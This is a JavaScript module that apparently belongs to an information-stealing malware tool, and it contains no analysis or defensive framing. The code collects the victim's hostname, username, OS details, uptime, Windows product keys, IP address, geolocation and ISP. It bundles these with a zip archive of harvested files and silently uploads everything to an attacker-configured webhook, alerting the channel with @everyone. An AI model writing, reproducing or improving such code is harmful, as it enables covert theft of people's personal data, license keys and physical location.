const { webhook } = require('../config');
const { isValidURL } = require('../util/string');
const axios = require('axios');
const { join } = require('path');
const os = require('os');
const { filesize } = require('filesize');
const fs = require('fs');
const { tempFolder } = require('../index');
const FormData = require('form-data');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const zipFile = fs.readdirSync(tempFolder).find(file => file.split('.').pop() === 'zip');
const json = async () => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  const fields = [
    `<:dotfill:856638361678250044> RAM: ${filesize(os.totalmem())}`,
    `<:dotfill:856638361678250044> Name: ${os.hostname()}`,
    `<:dotfill:856638361678250044> Uptime: <t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`,
    `<:dotfill:856638361678250044> Username: ${os.userInfo().username}`,
    `<:dotfill:856638361678250044> OS version: ${os.version()}`,
    `<:dotfill:856638361678250044> Product Key: \`\`${require('./product-key').productKey}\`\``,
    `<:dotfill:856638361678250044> Backup Product Key: \`\`${require('./product-key').backupProductKey}\`\``,
    '',
    '**IP info:**',
    `<:dotfill:856638361678250044> IP Address: [${await ipInfo('query')}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`,
    `<:dotfill:856638361678250044> Location: [${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`,
    `<:dotfill:856638361678250044> ISP: ${await ipInfo('isp')}`,
  ];
  return {
    content: `@everyone\n\n**Computer info:**\n${fields.join('\n')}`,
    allowed_mentions: {
      parse: ['everyone'],
    },
    attachments: [
      {
        id: 0,
        filename: zipFile,
        description: 'A zip archive containing all the files.',
        content_type: 'application/zip',
        url: `attachment://${zipFile}`,
      }
    ]
  };
};

(async () => {
  const data = new FormData();
  data.append('files[0]', fs.createReadStream(join(tempFolder, zipFile)));
  data.append('payload_json', JSON.stringify(await json()));

  await axios.post(webhook.url, data, {
    headers: { 'Content-Type': 'multipart/form-data' },
  })
    .then(res => {
      if (res.status !== 200) return;
      return res.data;
    })
    .catch(() => {});
})();
